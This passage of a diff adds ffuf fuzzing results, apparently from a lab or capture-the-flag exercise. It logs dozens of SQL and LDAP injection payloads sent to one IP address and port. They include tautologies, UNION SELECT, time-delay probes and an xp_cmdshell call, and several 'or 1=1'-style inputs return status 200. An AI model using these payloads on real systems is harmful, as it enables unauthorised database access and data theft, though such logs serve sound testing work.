+        "FUZZ": "x' AND userid IS NULL; --"
+      },
+      "position": 137,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 206471751,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1x' AND userid IS NULL; --",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf38d",
+        "FUZZ": " or benchmark(10000000,MD5(1))#"
+      },
+      "position": 141,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 128289811,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 or benchmark(10000000,MD5(1))#",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf38c",
+        "FUZZ": " (select top 1"
+      },
+      "position": 140,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 129981163,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 (select top 1",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf38e",
+        "FUZZ": "\");waitfor delay '0:0:__TIME__'--"
+      },
+      "position": 142,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 130120173,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1\");waitfor delay '0:0:__TIME__'--",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf395",
+        "FUZZ": "select"
+      },
+      "position": 149,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 116146799,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1select",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf393",
+        "FUZZ": "; exec master..xp_cmdshell"
+      },
+      "position": 147,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 118203237,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1; exec master..xp_cmdshell",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf398",
+        "FUZZ": "hi' or 1=1 --"
+      },
+      "position": 152,
+      "status": 200,
+      "length": 2633,
+      "words": 723,
+      "lines": 53,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 115743884,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1hi' or 1=1 --",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf391",
+        "FUZZ": " group by userid having 1=1--"
+      },
+      "position": 145,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 122385710,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 group by userid having 1=1--",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf394",
+        "FUZZ": "%20or%20x=x"
+      },
+      "position": 148,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 196079227,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1%20or%20x=x",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf392",
+        "FUZZ": " or ''='"
+      },
+      "position": 146,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 197130678,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 or ''='",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf396",
+        "FUZZ": "\")) or sleep(__TIME__)=\""
+      },
+      "position": 150,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 198626745,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1\")) or sleep(__TIME__)=\"",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf397",
+        "FUZZ": "0x730065006c0065006300740020004000400076006500 ..."
+      },
+      "position": 151,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 201441096,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/10x730065006c0065006300740020004000400076006500 ...",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf390",
+        "FUZZ": " -- &password="
+      },
+      "position": 144,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 202426982,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 -- &password=",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf399",
+        "FUZZ": "\") or pg_sleep(__TIME__)--"
+      },
+      "position": 153,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 197452471,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1\") or pg_sleep(__TIME__)--",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf39c",
+        "FUZZ": "exec sp"
+      },
+      "position": 156,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 205755747,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1exec sp",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3a0",
+        "FUZZ": "1 or pg_sleep(__TIME__)--"
+      },
+      "position": 160,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 132370113,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/11 or pg_sleep(__TIME__)--",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf39a",
+        "FUZZ": "%20or%20'x'='x"
+      },
+      "position": 154,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 208623316,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1%20or%20'x'='x",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf39e",
+        "FUZZ": "("
+      },
+      "position": 158,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 204094297,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1(",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf39b",
+        "FUZZ": " or 'something' = 'some'+'thing'"
+      },
+      "position": 155,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 211243068,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 or 'something' = 'some'+'thing'",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3a1",
+        "FUZZ": "0 or 1=1"
+      },
+      "position": 161,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 134699070,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/10 or 1=1",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3a2",
+        "FUZZ": ") or (a=a"
+      },
+      "position": 162,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 134648295,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1) or (a=a",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3a5",
+        "FUZZ": "%27%20or%201=1"
+      },
+      "position": 165,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 132403467,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1%27%20or%201=1",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf39f",
+        "FUZZ": "Ã½ or 1=1 --"
+      },
+      "position": 159,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 134027867,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1Ã½ or 1=1 --",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3a4",
+        "FUZZ": "replace"
+      },
+      "position": 164,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 131844564,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1replace",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3a7",
+        "FUZZ": "%7C"
+      },
+      "position": 167,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 204756965,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1%7C",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3a6",
+        "FUZZ": ")) or pg_sleep(__TIME__)--"
+      },
+      "position": 166,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 206606504,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1)) or pg_sleep(__TIME__)--",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3b0",
+        "FUZZ": "anything' OR 'x'='x"
+      },
+      "position": 176,
+      "status": 200,
+      "length": 2633,
+      "words": 723,
+      "lines": 53,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 128508691,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1anything' OR 'x'='x",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3a8",
+        "FUZZ": "x' AND 1=(SELECT COUNT(*) FROM tabname); --"
+      },
+      "position": 168,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 219832755,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1x' AND 1=(SELECT COUNT(*) FROM tabname); --",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3a9",
+        "FUZZ": "&apos;%20OR"
+      },
+      "position": 169,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 222684747,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1&apos;%20OR",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3aa",
+        "FUZZ": "; or '1'='1'"
+      },
+      "position": 170,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 219566679,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1; or '1'='1'",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3ab",
+        "FUZZ": "declare @q nvarchar (200) select @q = 0x770061 ..."
+      },
+      "position": 171,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 219486579,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1declare @q nvarchar (200) select @q = 0x770061 ...",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3ac",
+        "FUZZ": "1 or 1=1"
+      },
+      "position": 172,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 218581194,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/11 or 1=1",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3ad",
+        "FUZZ": "; exec ('sel' + 'ect us' + 'er')"
+      },
+      "position": 173,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 219317111,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1; exec ('sel' + 'ect us' + 'er')",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3ae",
+        "FUZZ": "23 OR 1=1"
+      },
+      "position": 174,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 148679707,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/123 OR 1=1",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3b3",
+        "FUZZ": "desc"
+      },
+      "position": 179,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 207343394,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1desc",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3b5",
+        "FUZZ": ")"
+      },
+      "position": 181,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 207981382,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1)",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3b1",
+        "FUZZ": "declare @q nvarchar (4000) select @q ="
+      },
+      "position": 177,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 210406532,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1declare @q nvarchar (4000) select @q =",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3b4",
+        "FUZZ": "||'6"
+      },
+      "position": 180,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 208665222,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1||'6",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3b2",
+        "FUZZ": "or 0=0 --"
+      },
+      "position": 178,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 215681992,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1or 0=0 --",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3b6",
+        "FUZZ": "1)) or sleep(__TIME__)#"
+      },
+      "position": 182,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 208531773,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/11)) or sleep(__TIME__)#",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3b7",
+        "FUZZ": "or 0=0 #"
+      },
+      "position": 183,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 210488159,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1or 0=0 #",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3b9",
+        "FUZZ": "hi or a=a"
+      },
+      "position": 185,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 211093826,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1hi or a=a",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3be",
+        "FUZZ": "to_timestamp_tz"
+      },
+      "position": 190,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 132361168,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1to_timestamp_tz",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3ba",
+        "FUZZ": "*(|(mail=*))"
+      },
+      "position": 186,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 209932775,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1*(|(mail=*))",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3b8",
+        "FUZZ": " select name from syscolumns where id = (sele ..."
+      },
+      "position": 184,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 212946214,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 select name from syscolumns where id = (sele ...",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3bd",
+        "FUZZ": ");waitfor delay '0:0:__TIME__'--"
+      },
+      "position": 189,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 134482582,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1);waitfor delay '0:0:__TIME__'--",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3bf",
+        "FUZZ": "\") or benchmark(10000000,MD5(1))#"
+      },
+      "position": 191,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 135097231,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1\") or benchmark(10000000,MD5(1))#",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3bc",
+        "FUZZ": "distinct"
+      },
+      "position": 188,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 143941064,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1distinct",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3c0",
+        "FUZZ": " UNION SELECT"
+      },
+      "position": 192,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 139253853,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 UNION SELECT",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3c9",
+        "FUZZ": "x' or 1=1 or 'x'='y"
+      },
+      "position": 201,
+      "status": 200,
+      "length": 2633,
+      "words": 723,
+      "lines": 53,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 123402203,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1x' or 1=1 or 'x'='y",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3c2",
+        "FUZZ": "+sqlvuln"
+      },
+      "position": 194,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 139751988,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1+sqlvuln",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3c4",
+        "FUZZ": ")) or sleep(__TIME__)='"
+      },
+      "position": 196,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 197609897,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1)) or sleep(__TIME__)='",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3c1",
+        "FUZZ": "%2A%28%7C%28mail%3D%2A%29%29"
+      },
+      "position": 193,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 207957123,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1%2A%28%7C%28mail%3D%2A%29%29",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3c7",
+        "FUZZ": "sqlvuln;"
+      },
+      "position": 199,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 196344207,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1sqlvuln;",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3c6",
+        "FUZZ": " or 1 in (select @@version)--"
+      },
+      "position": 198,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 200325748,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 or 1 in (select @@version)--",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3cb",
+        "FUZZ": "â or 3=3 --"
+      },
+      "position": 203,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 198063826,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1â or 3=3 --",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3c5",
+        "FUZZ": "or 1=1 or \"\"="
+      },
+      "position": 197,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 199930730,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1or 1=1 or \"\"=",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3c8",
+        "FUZZ": " union select * from users where login = char ..."
+      },
+      "position": 200,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 204650746,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 union select * from users where login = char ...",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3cd",
+        "FUZZ": " or '1'='1'--"
+      },
+      "position": 205,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 132669648,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 or '1'='1'--",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3cc",
+        "FUZZ": "@variable"
+      },
+      "position": 204,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 135643497,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1@variable",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3d0",
+        "FUZZ": "%2A%7C"
+      },
+      "position": 208,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 130815063,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1%2A%7C",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3ce",
+        "FUZZ": "\"a\"\" or 1=1--\""
+      },
+      "position": 206,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 131227530,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1\"a\"\" or 1=1--\"",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3d1",
+        "FUZZ": "\" or 0=0 --"
+      },
+      "position": 209,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 132690933,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1\" or 0=0 --",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3d6",
+        "FUZZ": "'"
+      },
+      "position": 214,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 114877053,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1'",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3d2",
+        "FUZZ": "\")) or pg_sleep(__TIME__)--"
+      },
+      "position": 210,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 128972433,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1\")) or pg_sleep(__TIME__)--",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3d3",
+        "FUZZ": "?"
+      },
+      "position": 211,
+      "status": 200,
+      "length": 2633,
+      "words": 723,
+      "lines": 53,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 121880420,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1?",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
